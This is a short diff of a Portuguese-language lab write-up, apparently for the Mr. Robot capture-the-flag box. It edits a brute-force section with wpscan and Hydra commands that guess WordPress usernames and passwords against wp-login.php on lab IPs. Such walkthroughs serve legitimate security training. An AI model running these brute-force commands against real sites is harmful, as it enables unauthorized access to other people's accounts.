@@ -50,11 +50,12 @@ sort fsocity.dic | uniq > fsocityUniq.txt  # Ordena e remove duplicados
 
 ## 4) Ataque de Força Bruta (Burp Suite + Hydra)
 ```bash
-wpscan --url 10.10.101.133 --passwords fsocityUniq.txt --usernames elliot
+wpscan --url 10.10.101.133 --passwords admin --usernames fsocityUniq.txt
 ```
 **Resultados:**
 Username: Not Found!
 
+**Burp Suite**: Interceptar a requisição do wp-login.php (usado pelo hydra)
 ```bash
 hydra -L fsocityUniq.txt -p admin 10.10.200.166 http-post-form "/wp-login.php:log=^USER^&pass=^PASS^&wp-submit=LOG+In&redirect_to=http%3aA%2F%2F10.10.200.166%2Fwp-admin%2F&testcookie=1:Invalid username" -F -V
 ```
